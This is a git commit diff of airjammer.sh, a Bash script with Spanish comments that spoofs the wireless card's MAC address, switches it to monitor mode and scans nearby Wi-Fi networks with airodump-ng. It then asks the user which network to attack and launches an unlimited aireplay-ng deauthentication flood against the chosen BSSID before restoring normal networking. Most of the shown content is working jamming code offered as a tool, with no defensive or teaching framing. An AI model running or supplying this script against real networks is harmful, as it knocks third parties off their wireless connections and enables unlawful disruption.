9a13b1af4036529e44ddbc6e9fe36688360b1cc5
hugots363 <hugots363@gmail.com>
2019-04-24 20:21:16 +0200

    Add existing file

--- airjammer.sh
+++ airjammer.sh
@@ -62,7 +62,7 @@ fi
 
 
 #Listar interfaces y elegir la nuestra
-echo "Introduce el numero de una interfaz de red de las listadas para realizar el ataque con ella"
+echo "Introduce el numero de una interfaz de red de las listadas para realizar el ataque con ella: "
 interfaces=()
 cont=0
 for iface in $(ifconfig | cut -d ' ' -f1| tr ':' '\n' | awk NF)
@@ -95,8 +95,6 @@ sudo ifconfig ${interfaces[$select]} hw ether $mac
 #Ponemos la tarjeta en modo monitor 
 #Revisar fallo SIOCSIFHWADDR: Argumento inválido
 
-
-sudo iwconfig ${interfaces[$select]} mode monitor
 echo "Matando los pocesos que puedan interferir con el ataque"
 sleep 1.5s
 sudo airmon-ng check kill
@@ -108,21 +106,69 @@ sudo airodump-ng -w output_red --output-format csv ${interfaces[$select]}
 #genera un archivo con las columnas BSSID,channel, intensidad y ESSID
 awk -F "\"*,\"*" '{print $1,$4,$9,$14}' output_red-01.csv > res.txt
 
-#essids=(); bssids=(); channels=(); power=() son los arrays con datos
-bssids=( $(cut -d ' ' -f1 res.txt) ) #empieza titulo en 0
-channel=( $(cut -d ' ' -f3 res.txt) ) #en 0
-power=( $(cut -d ' ' -f5 res.txt) ) #en 0
-essids=( $(cut -d ' ' -f7 res.txt) ) #en 0
+#Guardo en una var la cantidad de redes encontradas
+num="${#essids[@]}"
+#creo un array numerado con esa cantidad
+secuencia=($(seq 0 1 $num))
 
 
 # PARTE DE PRINTEAR NUMERADAS LAS REDES -- REVISAR TODO- -- MUERTE Y DESTRUCCION
-#eliminar primera linea csv
-awk '{if (NR!=1) {print}}' output_red-01.csv
-#numerar el CSV por lineas
-awk '{print NR  ") " $s}' output_red-01.csv 
-#rm output_red-01.csv
+#recorrer el CSV por lineas
+file="output_red-01.csv"
+sed -i '1d' $file
+sed -i '/Station /,/^\s*$/{d}' $file
+
+#eliminar columnas innecesarias y eliminando output
+cut -d, -f2,3,5,6,7,8,10,11,12,13,15 --complement output_red-01.csv > res
+rm $file
+file="res"
+cont=0
+secuencia=()
+
+while read a b c d; do 
+   bssids+=($a)
+   channel+=($b)
+   power+=($c)
+   essids+=($d)
+   secuencia+=("$cont")
+   (( ++cont ))
+done < <(sed 's/,/\t/g' res)
+
+
+#essids=(); bssids=(); channels=(); power=() son los arrays con datos
+# bssids=( $(cut -d ' ' -f1 $file) ) #empieza titulo en 0
+# channel=( $(cut -d ' ' -f2 $file) ) #en 0
+# power=( $(cut -d ' ' -f4 $file) ) #en 0
+# essids=( $(cut -d ' ' -f7 $file) ) #en 0
+
 #eligiendo red para atacar por el user
-echo "Introduce el numero de la red a atacar"
+clear
+cat res | sed 's/\t/,|,/g' | column -s ',' -t > final.txt
+rm res 
+nl -nrn final.txt -v 0
+rm final.txt 
+echo "Introduce el numero de la red a atacar: "
+read obj
+
+#comprobación red seleccionada
+# while  $obj < 0  ;do
+# 	echo ""
+# 	echo "Introduce un numero de red valido"
+# 	read obj
+# done
+rm res.txt
+iwconfig ${interfaces[$select]} channel ${channel[$obj]}
+aireplay-ng -0 0 -a ${bssids[$obj]} ${interfaces[$select]}
+
+
 
 
 #LIMPIAR AL SALIR!
+#Comprobar si funciona en todas las distros
+echo "Reestableciendo la conexión wifi"
+
+sudo ifconfig ${interfaces[$select]} down
+sudo iwconfig ${interfaces[$select]} mode managed
+sudo ifconfig ${interfaces[$select]} up
+
+sudo systemctl start NetworkManager
